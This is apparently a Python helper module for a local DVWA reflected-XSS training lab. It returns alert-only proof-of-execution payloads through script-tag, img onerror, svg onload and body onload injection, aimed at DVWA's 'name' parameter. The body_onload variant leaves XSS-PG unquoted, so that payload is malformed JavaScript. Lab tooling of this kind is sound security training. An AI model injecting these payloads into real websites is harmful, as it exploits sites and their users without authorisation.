"""Harmless proof-of-execution payloads for the local DVWA Reflected XSS lab."""

from dataclasses import dataclass
from enum import Enum


class PayloadProfile(str, Enum):
    REFLECTED = "reflected"


@dataclass(frozen=True)
class GeneratedPayload:
    profile: PayloadProfile
    value: str
    description: str
    parameter: str


# This payload only opens a local browser alert. It does not read or transmit data.
REFLECTED_POC = '<script>alert("XSS-PG")</script>'

# Using just a same "XSS-PG" harmless payload with a different HTML/JS injection method
REFLECTED_VARIANTS = {
    "script_tag": REFLECTED_POC,
    "img_onerror": '<img src=x onerror=alert("XSS-PG")>',
    "svg_onload": '<svg onload=alert("XSS-PG")>',
    "body_onload": '<body onload=alert(XSS-PG)>',
}

# To allow the browser tester to submit these payloads
ALLOWED_PAYLOADS = frozenset(REFLECTED_VARIANTS.values())

def list_variants(profile: PayloadProfile = PayloadProfile.REFLECTED) -> dict:
    """Return the {name: payload} variants available for a profile"""
    if PayloadProfile(profile) is PayloadProfile.REFLECTED:
        return dict(REFLECTED_VARIANTS)
    raise ValueError(f"Unsupported payload profile: {profile}")

def generate_payload(
        profile: PayloadProfile = PayloadProfile.REFLECTED, variant: str | None = None
) -> GeneratedPayload:
    """Return the supported, harmless payload for DVWA's reflected `name` input."""

    try:
        selected = PayloadProfile(profile)
    except ValueError as exc:
        raise ValueError(f"Unsupported payload profile: {profile}") from exc

    if selected is not PayloadProfile.REFLECTED:
        raise ValueError(f"Unsupported payload profile: {profile}")

    variants = REFLECTED_VARIANTS
    key = variant or "script_tag"
    if key not in variants:
        raise ValueError(
            f"Unknown variant '{variant}' . Choose from: {', '.join(variants)}"
        )

    return GeneratedPayload(
        profile=selected,
        value=variants[key],
        description=(
            f"Harmless JavaScript alert proof-of-execution ({key}) for "
            "DVWA Reflected XSS (Low)."
        ),
        parameter="name",
    )

        
